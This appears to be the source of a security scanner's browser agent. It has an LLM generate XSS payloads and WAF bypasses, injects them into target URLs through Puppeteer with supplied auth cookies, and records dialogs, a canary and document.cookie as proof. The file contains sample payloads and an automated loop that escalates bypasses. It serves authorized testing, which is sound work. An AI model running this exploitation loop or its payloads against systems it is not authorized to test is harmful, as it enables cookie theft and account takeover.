/** Browser agent: LLM-guided XSS proof system with bypass exhaustion */

import puppeteer from "puppeteer";
import type { Page } from "puppeteer";
import path from "node:path";
import { mkdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { streamChat } from "../../lib/llm.js";
import { agentLog, findings as findingsDb, scans } from "../../lib/db.js";
import type { Finding, BrowserEvidence } from "../../types/index.js";
import type { TokenAccumulator } from "../../lib/tokens.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PROJECT_ROOT = path.resolve(__dirname, "../../../../");
const EVIDENCE_DIR = path.join(PROJECT_ROOT, "data", "evidence");

const NAVIGATION_TIMEOUT_MS = 30_000;
const MAX_BYPASS_ROUNDS = 3;
const PAYLOADS_PER_ROUND = 3;
const XSS_PATTERNS = [/\bxss\b/, /cross-site scripting/, /\bcwe-79\b/, /template injection/];

// === Candidate Selection ===

function isXssCandidate(finding: Finding): boolean {
  // Only match on title and CWE — descriptions mention XSS as a consequence of unrelated findings
  // Word boundaries prevent false matches like "bxss" in domain names
  const searchText = [finding.title, finding.cwe]
    .filter(Boolean)
    .join(" ")
    .toLowerCase();
  return XSS_PATTERNS.some((p) => p.test(searchText));
}

function hasUsableEndpoint(endpoint: string): boolean {
  // Reject descriptive text that isn't an actual path/URL
  if (endpoint.includes("(") || endpoint.includes("discovered") || endpoint.includes("suspected")) {
    return false;
  }
  // Must start with / or http
  const trimmed = endpoint.split(",")[0].split(" ")[0].trim();
  return trimmed.startsWith("/") || trimmed.startsWith("http");
}

function isBrowserCandidate(finding: Finding): boolean {
  return finding.endpoint !== null && hasUsableEndpoint(finding.endpoint) && isXssCandidate(finding);
}

// === LLM Integration ===

async function collectLlmResponse(systemPrompt: string, userMessage: string, tokens?: TokenAccumulator): Promise<string> {
  const { stream, getUsage } = await streamChat(systemPrompt, userMessage, 4096);
  let text = "";
  for await (const chunk of stream) {
    if (chunk.type === "content_block_delta" && chunk.delta.type === "text_delta") {
      text += chunk.delta.text;
    }
  }
  tokens?.add(await getUsage());
  return text;
}

interface PayloadAttempt {
  payload: string;
  proofLevel: 1 | 2 | 3 | 4;
  detail: string;
}

const PAYLOAD_SYSTEM_PROMPT = `You are an XSS exploitation specialist for authorized security testing. Your job is to generate XSS payloads that will execute JavaScript in a browser.

RULES:
- Output ONLY a JSON array of payload strings, nothing else
- Each payload should be a complete, ready-to-inject string
- Consider the render context clues from the finding description
- Use diverse approaches: event handlers, script tags, SVG/MathML, template injection
- For bypass rounds, analyze why previous payloads failed and try different approaches

Example output:
["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "{{constructor.constructor('alert(1)')()}}"]`;

async function generatePayloads(
  finding: Finding,
  previousAttempts: PayloadAttempt[],
  tokens?: TokenAccumulator,
): Promise<string[]> {
  let userMessage: string;

  if (previousAttempts.length === 0) {
    userMessage = `Generate ${PAYLOADS_PER_ROUND} XSS payloads for this suspected vulnerability:

Title: ${finding.title}
Endpoint: ${finding.endpoint}
CWE: ${finding.cwe ?? "unknown"}
Description: ${finding.description ?? "No description"}

Generate payloads that will execute JavaScript. Include a canary: set window.__xss_proof = true in at least one payload. Use document.cookie access in another.`;
  } else {
    const attemptSummary = previousAttempts
      .map((a) => `- Payload: ${a.payload}\n  Result: Level ${a.proofLevel} — ${a.detail}`)
      .join("\n");

    userMessage = `Previous payloads were tried against this target but did not achieve JS execution:

Title: ${finding.title}
Endpoint: ${finding.endpoint}
CWE: ${finding.cwe ?? "unknown"}
Description: ${finding.description ?? "No description"}

Previous attempts:
${attemptSummary}

Analyze the failure patterns and generate ${PAYLOADS_PER_ROUND} bypass payloads using different techniques:
- Try encoding variations (HTML entities, URL encoding, double encoding)
- Try different injection contexts (event handlers, javascript: URIs, template expressions)
- Try WAF bypass techniques (case variation, null bytes, comment insertion)
- Include window.__xss_proof = true as canary in at least one payload`;
  }

  const response = await collectLlmResponse(PAYLOAD_SYSTEM_PROMPT, userMessage, tokens);

  // Extract JSON array from response
  const jsonMatch = response.match(/\[[\s\S]*?\]/);
  if (!jsonMatch) return [];

  try {
    const parsed: unknown = JSON.parse(jsonMatch[0]);
    if (!Array.isArray(parsed)) return [];
    return parsed.filter((p): p is string => typeof p === "string").slice(0, PAYLOADS_PER_ROUND);
  } catch {
    return [];
  }
}

// === 4-Level Proof System ===

interface ProofResult {
  level: 1 | 2 | 3 | 4;
  detail: string;
  screenshotPath: string | null;
  cookieData: string | null;
  dialogDetected: boolean;
}

function resolveEndpoint(endpoint: string, baseUrl: string): string {
  // Extract the first path from comma-separated or space-separated lists
  const first = endpoint.split(",")[0].split(" ")[0].trim();

  // Already absolute
  if (first.startsWith("http://") || first.startsWith("https://")) {
    return first;
  }
  // Relative path — resolve against base URL
  try {
    return new URL(first, baseUrl).href;
  } catch {
    return baseUrl.replace(/\/$/, "") + (first.startsWith("/") ? "" : "/") + first;
  }
}

function injectPayloadIntoUrl(endpoint: string, baseUrl: string, payload: string): string {
  const resolved = resolveEndpoint(endpoint, baseUrl);
  const url = new URL(resolved);

  // If there are existing query params, inject into each value
  if (url.searchParams.toString()) {
    const firstKey = url.searchParams.keys().next().value;
    if (firstKey !== undefined) {
      url.searchParams.set(firstKey, payload);
    }
    return url.href;
  }

  // For hash-based (DOM XSS), try fragment
  if (resolved.includes("#")) {
    return resolved.split("#")[0] + "#" + encodeURIComponent(payload);
  }

  // Default: append as query param
  url.searchParams.set("q", payload);
  return url.href;
}

async function testPayload(
  page: Page,
  endpoint: string,
  baseUrl: string,
  payload: string,
  scanId: string,
  findingId: string,
): Promise<ProofResult> {
  const targetUrl = injectPayloadIntoUrl(endpoint, baseUrl, payload);

  // 1. Set up dialog listener before navigation
  let dialogDetected = false;
  let dialogMessage = "";
  const dialogHandler = async (dialog: { message: () => string; dismiss: () => Promise<void> }) => {
    dialogDetected = true;
    dialogMessage = dialog.message();
    await dialog.dismiss();
  };
  page.on("dialog", dialogHandler);

  // 2. Inject canary detection before navigation
  await page.evaluateOnNewDocument("window.__xss_proof = false;");

  // 3. Navigate to the endpoint with payload
  try {
    await page.goto(targetUrl, {
      waitUntil: "networkidle2",
      timeout: NAVIGATION_TIMEOUT_MS,
    });
  } catch (navErr) {
    page.off("dialog", dialogHandler);
    const navMsg = navErr instanceof Error ? navErr.message : String(navErr);
    return { level: 1, detail: `Navigation failed: ${navMsg.slice(0, 100)}`, screenshotPath: null, cookieData: null, dialogDetected: false };
  }

  // Brief pause for deferred JS execution
  await new Promise((resolve) => setTimeout(resolve, 1000));

  // 4. Check proof levels (highest first)
  const cookieData = await page.evaluate("document.cookie").catch(() => "") as string;
  const canaryFired = await page.evaluate("window.__xss_proof === true").catch(() => false) as boolean;
  const pageContent = await page.content().catch(() => "");

  // Check if the raw payload appears in the page source (reflection check)
  const payloadReflected = pageContent.includes(payload) ||
    pageContent.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));

  // 5. Capture screenshot for Level 2+
  let screenshotPath: string | null = null;
  if (payloadReflected || dialogDetected || canaryFired) {
    const evidenceDir = path.join(EVIDENCE_DIR, scanId);
    mkdirSync(evidenceDir, { recursive: true });
    const filename = `${findingId}_${Date.now()}.png`;
    screenshotPath = filename;
    // Clip to visible content to avoid huge empty screenshots on sparse pages
    const clip = await page.evaluate(`({
      x: 0, y: 0,
      width: Math.min(1280, Math.max(document.body.scrollWidth, document.documentElement.scrollWidth)),
      height: Math.min(800, Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, 200))
    })`).catch(() => null) as { x: number; y: number; width: number; height: number } | null;
    await page.screenshot({
      path: path.join(evidenceDir, filename),
      ...(clip ? { clip } : { fullPage: false }),
    }).catch(() => { screenshotPath = null; });
  }

  page.off("dialog", dialogHandler);

  // Level 4: Impact demonstrated — cookies extracted or DOM mutated by payload
  if (dialogDetected && cookieData.length > 0) {
    return {
      level: 4,
      detail: `Impact demonstrated: dialog triggered ("${dialogMessage.slice(0, 50)}") + cookies extracted (${cookieData.length} chars)`,
      screenshotPath,
      cookieData: cookieData || null,
      dialogDetected: true,
    };
  }

  // Level 3: JS execution confirmed — dialog or canary
  if (dialogDetected) {
    return {
      level: 3,
      detail: `JS execution confirmed: dialog triggered with message "${dialogMessage.slice(0, 80)}"`,
      screenshotPath,
      cookieData: cookieData || null,
      dialogDetected: true,
    };
  }

  if (canaryFired) {
    return {
      level: 3,
      detail: "JS execution confirmed: window.__xss_proof canary was set to true",
      screenshotPath,
      cookieData: cookieData || null,
      dialogDetected: false,
    };
  }

  // Level 2: Payload reflected/injected but no JS execution
  if (payloadReflected) {
    return {
      level: 2,
      detail: "Payload reflected in page HTML but no JavaScript execution detected",
      screenshotPath,
      cookieData: null,
      dialogDetected: false,
    };
  }

  // Level 1: Payload blocked/not reflected
  return {
    level: 1,
    detail: "Payload not reflected in page content — likely blocked or encoded",
    screenshotPath: null,
    cookieData: null,
    dialogDetected: false,
  };
}

// === Bypass Exhaustion Loop ===

interface XssProofChainResult {
  evidence: BrowserEvidence;
  exploited: boolean;
}

async function runXssProofChain(
  finding: Finding,
  scanId: string,
  baseUrl: string,
  authHeaders?: Record<string, string>,
  tokens?: TokenAccumulator,
): Promise<XssProofChainResult> {
  const phase = "browser-confirm";
  const allAttempts: PayloadAttempt[] = [];
  let bestResult: ProofResult = { level: 1, detail: "No payloads tested", screenshotPath: null, cookieData: null, dialogDetected: false };
  let roundsCompleted = 0;

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
    args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
  });

  try {
    for (let round = 0; round <= MAX_BYPASS_ROUNDS; round++) {
      // Generate payloads
      await agentLog.insert({
        scan_id: scanId,
        phase,
        message: round === 0
          ? `Generating initial XSS payloads for: ${finding.title}`
          : `Bypass round ${round}/${MAX_BYPASS_ROUNDS} — generating alternative payloads`,
        metadata: { finding_id: finding.id, round },
      });

      const payloads = await generatePayloads(finding, allAttempts, tokens);

      if (payloads.length === 0) {
        await agentLog.insert({
          scan_id: scanId,
          phase,
          message: `LLM returned no payloads — ending proof chain`,
          metadata: { finding_id: finding.id, round },
        });
        break;
      }

      // Test each payload
      for (let i = 0; i < payloads.length; i++) {
        const payload = payloads[i];

        await agentLog.insert({
          scan_id: scanId,
          phase,
          message: `Testing payload ${i + 1}/${payloads.length} (round ${round})`,
          metadata: { finding_id: finding.id, round, payload_index: i },
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 800 });

        // Inject auth: set cookies and extra headers for authenticated scanning
        if (authHeaders) {
          const cookieHeader = authHeaders["Cookie"] ?? authHeaders["cookie"];
          if (cookieHeader) {
            const domain = new URL(baseUrl).hostname;
            const cookies = cookieHeader.split(";").map((c) => {
              const [name, ...rest] = c.trim().split("=");
              return { name: name.trim(), value: rest.join("=").trim(), domain };
            });
            await page.setCookie(...cookies);
          }
          // Set non-cookie auth headers (Authorization, X-API-Key, etc.)
          const nonCookieHeaders: Record<string, string> = {};
          for (const [k, v] of Object.entries(authHeaders)) {
            if (k.toLowerCase() !== "cookie") nonCookieHeaders[k] = v;
          }
          if (Object.keys(nonCookieHeaders).length > 0) {
            await page.setExtraHTTPHeaders(nonCookieHeaders);
          }
        }

        try {
          const result = await testPayload(page, finding.endpoint!, baseUrl, payload, scanId, finding.id);

          allAttempts.push({
            payload,
            proofLevel: result.level,
            detail: result.detail,
          });

          await agentLog.insert({
            scan_id: scanId,
            phase,
            message: `Payload result: Level ${result.level} — ${result.detail}`,
            metadata: {
              finding_id: finding.id,
              round,
              proof_level: result.level,
              payload_index: i,
            },
          });

          // Track best result
          if (result.level > bestResult.level) {
            bestResult = result;
          }

          // Level 3+ = confirmed, stop immediately
          if (result.level >= 3) {
            roundsCompleted = round + 1;
            await page.close();
            break;
          }
        } finally {
          if (!page.isClosed()) await page.close();
        }
      }

      roundsCompleted = round + 1;

      // If we got Level 3+, stop the loop
      if (bestResult.level >= 3) break;

      // If all payloads were Level 1 (completely blocked), one more round then bail
      if (round > 0 && allAttempts.every((a) => a.proofLevel === 1)) {
        await agentLog.insert({
          scan_id: scanId,
          phase,
          message: "All payloads blocked — target appears well-protected",
          metadata: { finding_id: finding.id },
        });
        break;
      }
    }
  } finally {
    await browser.close();
  }

  // If we have no screenshot but got Level 2+, take a clean one
  let screenshot = bestResult.screenshotPath ?? "";
  if (!screenshot && bestResult.level >= 2) {
    // Best effort — screenshot was already attempted in testPayload
    screenshot = "";
  }

  const exploited = bestResult.level >= 3;
  const evidence: BrowserEvidence = {
    screenshot,
    cookie_data: bestResult.cookieData,
    dialog_detected: bestResult.dialogDetected,
    confirmed: exploited,
    timestamp: new Date().toISOString(),
    proof_level: bestResult.level,
    proof_detail: bestResult.detail,
    payloads_attempted: allAttempts.map((a) => a.payload),
    bypass_rounds: roundsCompleted,
  };

  return { evidence, exploited };
}

// === Main Entry Point ===

export async function runBrowserConfirm(
  scanId: string,
  exploitFindings: Finding[],
  tokens?: TokenAccumulator,
): Promise<Finding[]> {
  const phase = "browser-confirm";
  const scan = scans.get(scanId);
  const baseUrl = scan?.url ?? "";
  const authHeaders = (scan?.metadata?.auth_headers ?? undefined) as Record<string, string> | undefined;
  const candidates = exploitFindings.filter(isBrowserCandidate);

  if (candidates.length === 0) {
    agentLog.insert({
      scan_id: scanId,
      phase,
      message: "No XSS findings eligible for browser confirmation",
      metadata: { total_findings: exploitFindings.length },
    });
    return exploitFindings;
  }

  agentLog.insert({
    scan_id: scanId,
    phase,
    message: `Browser agent: ${candidates.length} XSS candidate(s) to verify`,
    metadata: { candidate_count: candidates.length },
  });

  for (const finding of candidates) {
    agentLog.insert({
      scan_id: scanId,
      phase,
      message: `Starting XSS proof chain: ${finding.title}`,
      metadata: { finding_id: finding.id, endpoint: finding.endpoint },
    });

    try {
      const { evidence, exploited } = await runXssProofChain(finding, scanId, baseUrl, authHeaders, tokens);

      // Update finding with evidence and exploited status
      findingsDb.update(finding.id, {
        browser_evidence_json: evidence,
        ...(exploited ? { exploited: true } : {}),
        ...(evidence.proof_level >= 3 ? { confidence: "confirmed" as const } : {}),
      });

      const levelLabels: Record<number, string> = {
        1: "BLOCKED",
        2: "REFLECTED",
        3: "JS EXECUTION CONFIRMED",
        4: "IMPACT DEMONSTRATED",
      };

      agentLog.insert({
        scan_id: scanId,
        phase,
        message: `Proof chain complete: Level ${evidence.proof_level} — ${levelLabels[evidence.proof_level]}${exploited ? " [EXPLOITED]" : ""}`,
        metadata: {
          finding_id: finding.id,
          proof_level: evidence.proof_level,
          exploited,
          payloads_tested: evidence.payloads_attempted.length,
          bypass_rounds: evidence.bypass_rounds,
        },
      });
    } catch (err) {
      const errMsg = err instanceof Error ? err.message : String(err);
      agentLog.insert({
        scan_id: scanId,
        phase,
        message: `Browser agent failed for ${finding.title}: ${errMsg}`,
        metadata: { finding_id: finding.id, error: errMsg },
      });
    }
  }

  // Return fresh findings from DB (may have updated exploited status)
  const updatedFindings = findingsDb.list(scanId);
  return updatedFindings.length > 0 ? updatedFindings : exploitFindings;
}
